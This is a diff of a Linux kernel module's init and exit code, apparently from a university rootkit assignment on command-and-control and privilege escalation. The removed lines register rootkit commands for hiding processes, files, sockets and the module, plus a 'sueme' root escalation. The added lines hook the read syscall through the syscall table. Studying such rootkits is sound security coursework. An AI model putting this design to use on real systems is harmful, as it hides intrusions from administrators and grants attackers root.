@@ -3,44 +3,27 @@
 #include <linux/init.h> /* Needed for the macros, hints for linking and loading, see http://tldp.org/LDP/lkmpg/2.6/html/x245.html */
 
 #include "hooking.h"
-#include "file_hiding.h"
-#include "code_hiding.h"
-#include "process_hiding.h"
-#include "socket_hiding.h"
-#include "commands.h"
-#include "privilege_escalation.h"
-#include "sysmap.h"
+#include "read_hooking.h"
 
 #define DRIVER_AUTHOR "Nicolas Appel, Wenwen Chen"
 #define DRIVER_DESC   "Assigment 7 - Command and Control & Privilege Escalation"
 
+static void ** sct;
 static int __init mod_init(void)
 {
-	void ** sct = syscall_table();
+	sct = syscall_table();
 	if(sct != NULL)
 		printk(KERN_INFO "syscall table:%016lx\n",(long unsigned int) sct);
-	else if(sct == NULL) return 0;
-	listen();
-	hide_processes();
-	hide_sockets();
-	add_command("hideme", NOARG, hide_code); //hide module
-	add_command("unhideme", NOARG, unhide_code); //show module
-	add_command("hidepid", INTLST, hide_process); //hide pid
-	//add_command("unhidepc", NOARG, unhide_processes); //show process
-	add_command("hidefile", NOARG, hide_files); //hide files
-	add_command("unhidef", NOARG, unhide_files); //show files
-	add_command("sockhtcp", INTLST, hide_port_tcp); //hide tcp socket
-	add_command("sockhudp", INTLST, hide_port_udp); //hide udp socket
-	add_command("sueme", NOARG, root_me); //privilege escalation
-	//printk(KERN_INFO "mod_init\n");
+	else return 0;
+  hook_read(sct);
+
   return 0;
 }
 
 static void __exit mod_exit(void)
 {
-  stop_listen();
-  unhide_processes();
-  unhide_sockets();
+	if(sct == NULL) return;
+  unhook_read(sct);
 }
 
 
